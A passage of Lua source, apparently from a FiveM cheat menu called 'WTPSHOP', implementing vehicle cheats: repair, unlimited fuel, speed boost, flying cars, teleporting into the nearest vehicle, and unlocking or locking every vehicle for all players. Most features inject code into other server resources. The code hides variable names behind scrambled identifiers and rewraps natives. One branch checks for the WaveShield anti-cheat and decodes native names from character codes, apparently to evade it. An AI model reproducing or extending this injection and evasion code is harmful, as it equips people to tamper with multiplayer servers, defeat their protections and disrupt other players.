                                        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
                                            _g(_b("SetVehicleFixed"))(vehicle)
                                            _g(_b("SetVehicleDeformationFixed"))(vehicle)
                                            _g(_b("SetVehicleUndriveable"))(vehicle, false)
                                            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
                                            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
                                            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
                                            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
                                            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
                                        end
                                    ]])
                                end
                            end
                        },
                        { type = "button", label = "Clean Vehicle",
                            onSelect = function()
                                executeCode('any', [[
                                    local veh = GetVehiclePedIsUsing(PlayerPedId())
                                    if veh and veh ~= 0 then
                                        SetVehicleDirtLevel(veh, 0.0)
                                    end
                                ]])
                            end
                        },
                        { type = "button", label = "Force Vehicle Engine",
                            onSelect = function()
                            executeCode(ApiRasclat.TxResource(), [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]])
                        end, function()
                            executeCode(ApiRasclat.TxResource(), [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]])
                            end
                        },
                        { type = "button", label = "Delete Vehicle",
                            onSelect = function()
                                executeCode('any', [[
                                    local veh = GetVehiclePedIsUsing(PlayerPedId())
                                    if veh and veh ~= 0 then
                                        DeleteVehicle(veh)
                                    end
                                ]])
                            end
                        },
                        { type = "button", label = "Lock Closest Vehicle",
                            onSelect = function()
                                executeCode('any', [[
                                    local ped = PlayerPedId()
                                    local pos = GetEntityCoords(ped)
                                    local veh = GetClosestVehicle(pos.x, pos.y, pos.z, 5.0, 0, 70)
                                    if veh and DoesEntityExist(veh) then
                                        for i = 1, 2 do
                                            SetVehicleDoorsLockedForAllPlayers(veh, true)
                                            Wait(1)
                                        end
                                    end
                                ]])
                            end
                        },
                        { type = "button", label = "Unlock Closest Vehicle",
                            onSelect = function()
                                executeCode('any', [[
                                    local ped = PlayerPedId()
                                    local pos = GetEntityCoords(ped)
                                    local veh = GetClosestVehicle(pos.x, pos.y, pos.z, 5.0, 0, 70)
                                    if veh and DoesEntityExist(veh) then
                                        for i = 1, 2 do
                                            SetVehicleDoorsLockedForAllPlayers(veh, false)
                                            Wait(1)
                                        end
                                    end
                                ]])
                            end
                        },
                        { type = "button", label = "Teleport into Closest Vehicle",
                            onSelect = function()
                                WTPSHOP:Notify("success", "WTPSHOP", "Teleported into Vehicle", 3000)
                                executeCode("any", [[
                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                    local function uPKcoBaEHmnK()
                                        local ziCFzHyzxaLX = SetPedIntoVehicle
                                        local YPPvDlOGBghA = GetClosestVehicle

                                        local Coords = GetEntityCoords(PlayerPedId())
                                        local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                        if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                            if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                                ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                            else
                                                ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                            end
                                        end
                                    end

                                    uPKcoBaEHmnK()
                                ]])
                            end
                        },
                        { type = "button", label = "Remove All Doors",
                            onSelect = function()
                                executeCode("any", [[
                                    local playerPed = PlayerPedId()
                                    local vehicle = GetVehiclePedIsIn(playerPed, false)

                                    if vehicle == 0 then return end
                                    for i = 0, 3 do
                                        SetVehicleDoorBroken(vehicle, i, false)
                                    end

                                    SetVehicleDoorOpen(vehicle, 5, false, false)
                                ]])
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "Force Engine On",
                            checked = false,
                            desc = "Keeps the vehicle engine running without hotwiring.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.ForceEngineOnActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.ForceEngineOnActive do
                                                local selfPed = PlayerPedId()
                                                local vehicle = GetVehiclePedIsIn(selfPed, false)

                                                if vehicle ~= 0 and GetPedInVehicleSeat(vehicle, -1) == selfPed then
                                                    WTPSHOP.Native(SetVehicleEngineOn, vehicle, true, true, true)
                                                    WTPSHOP.Native(SetVehicleUndriveable, vehicle, false)
                                                    WTPSHOP.Native(SetVehicleNeedsToBeHotwired, vehicle, false)
                                                end

                                                Wait(0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.ForceEngineOnActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Disable Locks",
                            checked = false,
                            desc = "Unlocks all vehicles so you can enter any door.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.DisableLocksActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.DisableLocksActive do
                                                if IsControlPressed(0, 23) or IsDisabledControlPressed(0, 23) then
                                                    local selfPlayer = PlayerId()
                                                    local vehicles = GetGamePool('CVehicle')

                                                    for i = 1, #vehicles do
                                                        local entity = vehicles[i]

                                                        WTPSHOP.Native(SetEntityAsMissionEntity, entity, true, true)
                                                        WTPSHOP.Native(SetVehicleDoorsLocked, entity, 1)
                                                        WTPSHOP.Native(SetVehicleDoorsLockedForPlayer, entity, selfPlayer, false)
                                                        WTPSHOP.Native(SetVehicleDoorsLockedForAllPlayers, entity, false)
                                                        WTPSHOP.Native(SetVehicleNeedsToBeHotwired, entity, false)
                                                        WTPSHOP.Native(SetVehicleCanBeUsedByFleeingPeds, entity, true)
                                                        WTPSHOP.Native(SetVehicleUndriveable, entity, false)

                                                        Wait(10)
                                                    end
                                                end

                                                Wait(100)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.DisableLocksActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Hard Braking",
                            checked = false,
                            desc = "Stops your vehicle instantly when braking.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.HardBrakingActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.HardBrakingActive do
                                                if IsControlJustPressed(0, 31) then
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)

                                                    if vehicle and vehicle > 0 and DoesEntityExist(vehicle) then
                                                        WTPSHOP.Native(SetEntityVelocity, vehicle, 0.0, 0.0, 0.0)
                                                    end
                                                end

                                                Wait(0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.HardBrakingActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "No Fall Off",
                            checked = false,
                            desc = "revents falling off bikes and similar vehicles.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.NoFallOffActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.NoFallOffActive do
                                                WTPSHOP.Native(SetPedCanBeKnockedOffVehicle, PlayerPedId(), 1)
                                                Wait(1000)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.NoFallOffActive = false
                                        WTPSHOP.Native(SetPedCanBeKnockedOffVehicle, PlayerPedId(), 0)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Vehicle Fly",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    WTPSHOP:Notify("success", "WTPSHOP", "Press [Y] Select a vehicle to control. | [G] Fly the vehicle. | [L] Freeze/unfreeze the vehicle", 3000)
                                    Control_Vehicle = true
                                    Control_Vehicle_Thread = CreateThread(function()
                                        while Control_Vehicle do
                                            Wait(0)
                                            if IsControlJustPressed(0, 182) then ToggleFreezeVehicle(selectedVehicle) end
                                            if IsControlJustPressed(0, 246) then
                                                if selectedVehicle and DoesEntityExist(selectedVehicle) then SetEntityDrawOutline(selectedVehicle, false) end
                                                selectedVehicle = GetClosestVehicle()
                                                if selectedVehicle then WTPSHOP:Notify("success", "WTPSHOP", "Successfully Selected Vehicle!", 3000) end
                                            end

                                            if selectedVehicle and DoesEntityExist(selectedVehicle) then
                                                DrawVehicleOutline(selectedVehicle)
                                                if IsControlPressed(0, 47) then
                                                    if not isVehicleFlying then isVehicleFlying = true SetEntityHasGravity(selectedVehicle, false) end
                                                    local camRot = GetGameplayCamRot(2)
                                                    local propulsionSpeed = 50.0
                                                    local dirX = -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                                                    local dirY = math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                                                    local dirZ = math.sin(math.rad(camRot.x))
                                                    SetEntityVelocity(selectedVehicle, dirX * propulsionSpeed, dirY * propulsionSpeed, dirZ * propulsionSpeed)
                                                else
                                                    if isVehicleFlying then isVehicleFlying = false SetEntityHasGravity(selectedVehicle, true) end
                                                end
                                            end
                                        end
                                    end)
                                else
                                    WTPSHOP:Notify("error", "WTPSHOP", "Vehicle fly disabled.", 3000)
                                    Control_Vehicle = false
                                    if Control_Vehicle_Thread then
                                        TerminateThread(Control_Vehicle_Thread)
                                        Control_Vehicle_Thread = nil
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Boost Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    WTPSHOP:Notify("success", "WTPSHOP", "Boost Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        ApiRasclat.RouteFeature("waveshield", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]], "WaveShield")
                                    else
                                        ApiRasclat.RouteFeature("godmode", [[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]])
                                    end
                                else
                                    WTPSHOP:Notify("error", "WTPSHOP", "Boost Vehicle Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        executeCode(ApiRasclat.TxResource(), [[
                                            _G.superSpeedBoost = false
                                        ]])
                                    else
                                        executeCode("any", [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Rainbow Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                local target = GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any"
                                if checked then
                                    WTPSHOP:Notify("success", "WTPSHOP", "Rainbow Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        print("souygdfg")
                                        executeCode(target, [[
                                            if not _G.WTPSHOPRainbow then
                                                _G.WTPSHOPRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.WTPSHOPRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.WTPSHOPRainbow.originals[name] then
                                                    _G.WTPSHOPRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.WTPSHOPRainbow.thread then
                                                _G.WTPSHOPRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.WTPSHOPRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.WTPSHOPRainbow.enabled and coroutine.status(_G.WTPSHOPRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.WTPSHOPRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]])
                                    else
                                        executeCode(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]])
                                    end
                                else
                                    WTPSHOP:Notify("error", "WTPSHOP", "Rainbow Vehicle Off", 3000)
                                    if GetResourceState("WaveShield") == "started" then
                                        print("swave")
                                        executeCode(target, [[
                                            if not _G.WTPSHOPRainbow then
                                                _G.WTPSHOPRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.WTPSHOPRainbow.enabled = false

                                            for name, orig in pairs(_G.WTPSHOPRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.WTPSHOPRainbow.thread and coroutine.status(_G.WTPSHOPRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.WTPSHOPRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]])
                                    else
                                        executeCode(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]])
                                    end
                                end
                            end,
                        },
                        { type = "checkbox", label = "Unlimited Fuel", checked = false,
                            onSelect = function(checked)
                                if checked then
                                    WTPSHOP:Notify("success", "WTPSHOP", "Unlimited Fuel On", 3000)
                                    executeCode(ApiRasclat.TxResource(), [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                        if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                        BlNkJmLzXcVb = true

                                        local function LqWyXpR3tV()
                                            local TmPlKoMiJnBg = CreateThread
                                            local ZxCvBnMaSdFg = PlayerPedId
                                            local YhUjIkOlPlMn = IsPedInAnyVehicle
                                            local VcXzQwErTyUi = GetVehiclePedIsIn
                                            local KpLoMkNjBhGt = DoesEntityExist
                                            local JkLzXcVbNmAs = SetVehicleFuelLevel

                                            TmPlKoMiJnBg(function()
                                                while BlNkJmLzXcVb and not Unloaded do
                                                    local ped = ZxCvBnMaSdFg()
                                                    if YhUjIkOlPlMn(ped, false) then
                                                        local veh = VcXzQwErTyUi(ped, false)
                                                        if KpLoMkNjBhGt(veh) then
                                                            JkLzXcVbNmAs(veh, 100.0)
                                                        end
                                                    end
                                                    Wait(100)
                                                end
                                            end)
                                        end

                                        LqWyXpR3tV()
                                    ]])
                                else
                                    WTPSHOP:Notify("error", "WTPSHOP", "Unlimited Fuel Off", 3000)
                                    executeCode(ApiRasclat.TxResource(), [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                        BlNkJmLzXcVb = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Vehicle Remote",
                            checked = false,
                            desc = "Y select nearest veh, E push, F freeze/unfreeze.",
                            onSelect = function(checked)
                                WTPSHOP:ToggleVehicleRemote(checked)
                            end
                        },
                        { type = "divider", label = "Vehicle Tricks" },
                        { icon = "", type = "scrollable", value = 1, values = { "Kick Flip", "Back Flip", "Jump", "Flip" }, label = "Vehicle Stunts", desc = "Applies physics stunts",
                            onSelect = function(value)
                                if value == "Kick Flip" then
                                    executeCode("any", [[
                                        local playerVeh = GetVehiclePedIsIn(PlayerPedId(), true)
                                                
                                        if DoesEntityExist(playerVeh) then
                                            ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 10.0, 90.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                                        end
                                    ]])
                                elseif value == "Back Flip" then
                                    executeCode("any", [[
                                        local playerVeh = GetVehiclePedIsIn(PlayerPedId(), true)
                                                
                                        if DoesEntityExist(playerVeh) then
                                            ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 15.0, 0.0, 60.0, 0.0, 0, 0, 1, 1, 0, 0)
                                        end
                                    ]])
                                elseif value == "Jump" then
                                    executeCode("any", [[
                                        local playerVeh = GetVehiclePedIsIn(PlayerPedId(), true)
                                                
                                        if DoesEntityExist(playerVeh) then
                                            ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 15.0, 0.0, 0.0, 00.0, 0, 1, 0, 1, 0, 0)
                                        end
                                    ]])
                                elseif value == "Flip" then
                                    executeCode("any", [[
                                        local function vXmYLT9pq2()
                                            local a = PlayerPedId
                                            local b = GetVehiclePedIsIn
                                            local c = GetEntityHeading
                                            local d = SetEntityRotation

                                            local ped = a()
